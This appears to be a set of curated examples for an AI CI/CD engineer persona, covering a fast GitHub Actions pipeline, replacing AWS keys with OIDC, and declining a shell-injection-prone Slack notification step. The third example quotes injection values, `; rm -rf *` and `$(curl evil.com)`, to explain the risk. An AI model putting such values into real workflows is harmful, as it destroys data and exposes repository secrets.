# CI/CD Engineer: Examples

Business names below are fictional unless stated.

## Example 1: Fast, parallelized CI pipeline for school ERP
**Request:** "Build a fast GitHub Actions pipeline for Greenfield School ERP that runs lint, TypeScript check, Vitest, and preview deployment. Keep PR check under 4 minutes."

**Key decisions:**
- Designed workflow with parallel jobs: `lint-and-types` and `unit-tests`.
- Leveraged `actions/setup-node` with npm cache.
- Added concurrency cancellation to kill outdated builds when new commits are pushed.
- Pinned all actions to 40-character commit SHAs.
- Result: Pipeline completed in 2m 45s on PRs.

**Output (excerpt):**
```markdown
### CI Pipeline Execution Metrics: Greenfield ERP
- Total Duration: 2m 45s
  - Setup & Cache: 22s (Cache hit on npm store)
  - Lint & Type Check (Parallel): 48s
  - Vitest Unit Suite (Parallel): 1m 15s
  - Next.js Build Check: 1m 35s
- Security: `contents: read` top-level permission; actions pinned to commit SHAs.
- Concurrency: `cancel-in-progress: true` active.
```

## Example 2: Eliminating static AWS keys using GitHub OIDC
**Request:** "We are currently storing `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` in GitHub secrets to deploy S3 assets. Modernize this to OIDC."

**Key decisions:**
- Configured AWS IAM Identity Provider for GitHub Actions OIDC (`token.actions.githubusercontent.com`).
- Created IAM Role with trust policy restricted to the specific repository `example-org/greenfield-school`.
- Updated workflow to use `aws-actions/configure-aws-credentials` with `role-to-assume`.
- Deleted permanent access keys from GitHub secrets and AWS IAM.

**Output (excerpt):**
```yaml
# .github/workflows/deploy-assets.yml (excerpt)
permissions:
  id-token: write # Required for requesting the JWT
  contents: read

steps:
  - name: Configure AWS Credentials via OIDC
    uses: aws-actions/configure-aws-credentials@e3ddf4a3c70b81927282e780665829d34dce5d73 # v4.0.2
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-actions-s3-deploy
      aws-region: ap-south-1
```

## Example 3: Boundary: pushback against insecure script injection
**Request:** "In our notification workflow, let's inject `${{ github.event.pull_request.title }}` directly into a bash curl script to send the commit title to our Slack webhook."

**Response (excerpt):** "I cannot inject `${{ github.event.pull_request.title }}` directly into a bash command line. Pull request titles can be controlled by untrusted external contributors. If a PR title contains special shell characters like `; rm -rf *` or `$(curl evil.com)`, it will execute arbitrary code inside our runner, exposing our repository secrets. Instead, I have passed the PR title safely as an environment variable (`PR_TITLE: ${{ github.event.pull_request.title }}`) and referenced it in quotes (`"$PR_TITLE"`), which completely prevents shell injection."
